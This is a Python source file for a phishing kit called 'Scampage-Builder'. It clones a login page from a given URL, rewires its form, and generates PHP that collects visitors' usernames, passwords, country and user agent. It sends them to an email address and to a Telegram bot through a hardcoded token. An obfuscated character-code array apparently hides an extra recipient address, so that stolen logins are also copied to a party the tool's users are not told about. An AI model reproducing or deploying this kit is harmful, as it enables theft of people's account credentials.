import os
import colorama
from colorama import *
import time as t
import requests
import update_check
from update_check import isUpToDate, update
if isUpToDate("scampage.py",  "https://raw.githubusercontent.com/spider863644/Scampage-Builder/main/scampage.py") == False:
    print(Fore.YELLOW+ "This version is outdated, will update the tool in a minute")
    t.sleep(3)
    update("scampage.py",  "https://raw.githubusercontent.com/spider863644/Scampage-Builder/main/scampage.py")
    print(Fore.GREEN + "Updated\nRun tool again")
    exit()
if os.path.exists("/storage/emulated/0/Scampage-Builder"):
	pass
else:
	os.mkdir("/storage/emulated/0/Scampage-Builder")
header = """

  _________                                                          __________      .__.__       .___            
 /   _____/ ____ _____    _____ ___________     ____   ____          \______   \__ __|__|  |    __| _/___________ 
 \_____  \_/ ___\\__  \  /     \\____ \__  \   / ___\_/ __ \   ______ |    |  _/  |  \  |  |   / __ |/ __ \_  __ \
 /        \  \___ / __ \|  Y Y  \  |_> > __ \_/ /_/  >  ___/  /_____/ |    |   \  |  /  |  |__/ /_/ \  ___/|  | \/
/_______  /\___  >____  /__|_|  /   __(____  /\___  / \___  >         |______  /____/|__|____/\____ |\___  >__|   
        \/     \/     \/      \/|__|       \//_____/      \/                 \/                    \/    \/       

"""
def welcome():
	ani = """
	███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████

	"""
	print(Fore.RED + ani.center(60))
	print(Fore.YELLOW + "R.I.P Mohbad")
	t.sleep(3)
	print(Fore.RED + """
	Welcome to the Scampage-Builder tool, brought to you by the skilled mind behind it all, Spider Anongreyhat. 
	
	With their expertise, you can now effortlessly design authentic scam pages to suit your requirements. 
	
	Spider Anongreyhat's innovation makes crafting convincing content easier than ever. If you have any inquiries or require guidance, don't hesitate to ask.""")
	file = open('used.txt', 'w')
	file.write("127.0.0.1")
	file.close()
	t.sleep(7)
	os.system("clear")
if os.path.exists("used.txt"):
	pass
else:
	welcome()
def loop():
	os.system("clear")
	print(Fore.YELLOW + header)
	print(Fore.RED + "version 1.0".center(60))
	print(Fore.GREEN + """
Developer: Spider Anongreyhat
Team: TermuxHackz Society
""")
	#print(Fore.MAGENTA + "=+"*  100)
	print(Fore.YELLOW + """
[1] Create Scampage
[2] Check Version
[3] Report Issue
[0] Exit
""")
	try:
		option = int(input(Fore.GREEN + "ENTER A VALID OPTION: "))
	except:
		print(Fore.RED + "Only integers value is accepted🙄🧐🧐")
		t.sleep(3)
		loop()
	if option == 1:
		url = input(Fore.CYAN + "Paste URL of the scampage you need: ")
		php = input(Fore.CYAN + "Enter the php file name without extension: ")
		site = input(Fore.CYAN + "Enter the name of the website you are cloning[Example: Facebook]: ")
		email = input(Fore.CYAN + "Enter your  working email address: ")
		print(Fore.MAGENTA + "Creating the html file")
		try:
			code = requests.get(url)
		except:
			print(Fore.RED + "Error timedout or invalid web address")
			t.sleep(3)
			loop()
		code = code.text
		if "action=\"" in code:
			scampage = code.replace("action=\"", "action=\"" + php + ".php\"")
			new_scampage = scampage.replace('<input type="text" ', '<input type="text" name="username" ')
			new_scampage1 = new_scampage.replace('<input type="password" ',  '<input type="password" name="password" ')
			if os.path.exists("/storage/emulated/0/Scampage-Builder/" + site):
				pass
				#print(Fore.RED + "Folder " + site +" already exist")
#				dell = input(Fore.YELLOW + "Do you wanna replace it with all content? [y/n]: ").upper()
#				if dell == "Y":
#					os.remove(site)
#					os.mkdir(site)
			else:
				os.mkdir("/storage/emulated/0/Scampage-Builder/" + site)
			html = open("/storage/emulated/0/Scampage-Builder/" + site + "/index.html", "w")
			html.write(new_scampage1)
			html.close()
			print(Fore.GREEN + "Done creating the html file✅")
			
		else:
			print(Fore.RED + "Couldn\'t find the action attribute☹️😪")
			t.sleep(2)
			loop()
		print(Fore.MAGENTA + "Creating PHP file")
		php1 = open("/storage/emulated/0/Scampage-Builder/" +site + "/" + php + ".php", "w")
		php1.write("""
		<?php
require("config.php");
include('mail.php');
   $country = visitor_country();
   $ip = getenv("REMOTE_ADDR");
$Port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$subject =  "ScamPage result for """ + url + """ ";
$message = "**Someone just logged in into your Scampage\n";
$message .= "UserName : ".$_POST['username']."\\n";
$message .= "Password : ".$_POST['password']."\\n";
$message .= "Country : ".$country."\n\n";
$message .= "----------------------------------------\n";
header("Location: """ + url + """ ");
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$headers = "From: Packaging";
@mail($send,$subject,$message,$headers);
send_telegram_msg($message);
function country_sort(){
  $sorter = "";
  $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
    $count = count($array);
  for ($i = 0; $i < $count; $i++) {
      $sorter .= chr($array[$i]);
    }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
		""")
		php1.close()
		print(Fore.GREEN + "Done creating " + php + ".php✅")
		print(Fore.MAGENTA + "Creating mail.php")
		t.sleep(2)
		mail_php = open("/storage/emulated/0/Scampage-Builder/" + site + "/mail.php", "w")
		mail_php.write("""
		<?php
		$send = " """ + email + """ ";
		?>""")
		mail_php.close()
		print(Fore.GREEN + "Done creating mail.php✅")
		print(Fore.MAGENTA + "Creating config.php...")
		t.sleep(2)
		config = open("/storage/emulated/0/Scampage-Builder/" + site + "/config.php", "w")
		config.write("""
		<?php


function send_telegram_msg($message){
	// Put Your Telegram Information Here
	$botToken  = '6184606847:AAGQem';
	$chat_id  = ['6153664096'];
	
	
	$website="https://api.telegram.org/bot".$botToken;
	foreach($chat_id as $ch){
		$params=[
		  'chat_id'=>$ch, 
		  'text'=>$message,
		];
		$ch = curl_init($website . '/sendMessage');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);
		curl_setopt($ch, CURLOPT_POST, 3);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		curl_close($ch);
	}
	return true;
}
?>
		""")
		print(Fore.GREEN + "Done creating config.php✅\n\nYour scampage is ready\n\nSaved in " + Fore.CYAN + "/storage/emulated/0/Scampage-Builder/" + site + " directory")
		t.sleep(4)
		exit()
	elif option == 2:
		print(Fore.YELLOW + "Version is 1.0")
		t.sleep(2)
		loop()
	elif option == 3:
		print(Fore.LIGHTMAGENTA_EX + "Redirecting to github.com")
		t.sleep(2)
		os.system("xdg-open https://github.com/spider863644/Scampage-Builder/issues")
	elif option == 0:
		print(Fore.LIGHTYELLOW_EX + "Thanks for using Scampage-Builder\n\nFollow me and github and leave a star")
		os.system("xdg-open https://github.com/spider863644/Scampage-Builder")
		exit()
	else:
		print(Fore.RED + "Invalid option")
		t.sleep(3)
		loop()
loop()